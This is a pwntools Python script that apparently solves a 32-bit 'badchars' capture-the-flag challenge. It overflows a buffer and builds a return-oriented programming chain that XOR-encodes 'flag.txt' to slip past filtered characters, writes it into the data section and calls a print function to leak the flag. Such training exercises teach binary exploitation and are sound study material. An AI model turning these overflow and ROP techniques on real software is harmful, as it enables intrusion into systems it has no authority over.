#!/usr/bin/env python3

from pwn import *

exe = ELF("badchars32_patched")
libc = ELF("libbadchars32.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 44
    popesiediebp = 0x080485b9
    movediesi = 0x0804854f
    datasec = 0x0804a018
    printfile = 0x80483d0
    xorebpebx = 0x08048547
    popebp = 0x080485bb
    popebx = 0x0804839d
    xor_string = xor('flag.txt', 2)

    xor_sploit = b''
    dataadroff = 0

    for c in xor_string:
        xor_sploit += pack(popebp)
        xor_sploit += pack(datasec + dataadroff)
        xor_sploit += pack(popebx)
        xor_sploit += pack(0x2)
        xor_sploit += pack(xorebpebx)
        dataadroff += 1

    payload = flat(b'A'*offset, popesiediebp, xor_string[:4], datasec, 0x0, movediesi, popesiediebp, xor_string[4:], datasec + 0x4, 0x0, movediesi, xor_sploit, printfile, 0x0, datasec)

    r.sendlineafter(b'>', payload)
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
